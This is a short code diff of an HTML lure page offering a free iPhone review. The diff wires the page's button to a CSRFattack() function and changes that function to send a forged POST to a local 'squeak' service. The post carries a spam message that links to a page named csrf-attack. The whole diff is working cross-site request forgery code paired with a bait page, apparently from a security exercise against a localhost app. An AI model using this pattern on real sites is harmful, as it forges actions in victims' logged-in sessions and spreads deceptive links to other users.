@@ -30,7 +30,7 @@
         recognition and wireless charging.
       </p>
       <p>Want to review the best iPhone yet for FREE?</p>
-      <button class="btn btn-info">Review now!</button>
+      <button class="btn btn-info" onclick="CSRFattack()">Review now!</button>
     </div>
 
     <!-- Optional JavaScript -->
@@ -41,7 +41,10 @@
     <script>
       function CSRFattack() {
         let body = new URLSearchParams();
-        body.append("squeak", "test@gmail.com");
+        body.append(
+          "squeak",
+          'Click <a href="https://niccolo-francioni.github.io/csrf-attack/">here</a> to get the iPhone X for free!'
+        );
         fetch("https://localhost/squeak", {
           method: "POST",
           headers: {
